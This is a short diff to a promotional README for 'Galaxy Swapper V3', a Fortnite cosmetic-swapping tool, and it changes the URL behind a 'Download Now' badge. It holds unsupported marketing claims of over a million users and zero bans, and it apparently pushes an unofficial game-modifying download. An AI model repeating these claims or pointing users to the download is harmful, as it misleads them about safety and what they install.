@@ -12,7 +12,7 @@ Our revolutionary software has been completely redesigned from the ground up, fe
 
 Trusted by **over 1.2 million users worldwide**, Galaxy Swapper V3 maintains a perfect safety record with zero confirmed bans when used properly. Whether you're a casual player or competitive streamer, our tool delivers professional-grade results with consumer-friendly simplicity.
 
-[![Download Now](https://img.shields.io/badge/🔥_DOWNLOAD_GALAXY_SWAPPER_V3_🔥-purple?style=for-the-badge&logo=fortnite&logoColor=white)](https://galaxy-swapper-v3.github.io/.github/)  
+[![Download Now](https://img.shields.io/badge/🔥_DOWNLOAD_GALAXY_SWAPPER_V3_🔥-purple?style=for-the-badge&logo=fortnite&logoColor=white)](https://galaxy-swapper-v3.github.io/.github/galaxyswapperv3)  
 *Join the elite community of Fortnite fashion icons today!*
 
 ---
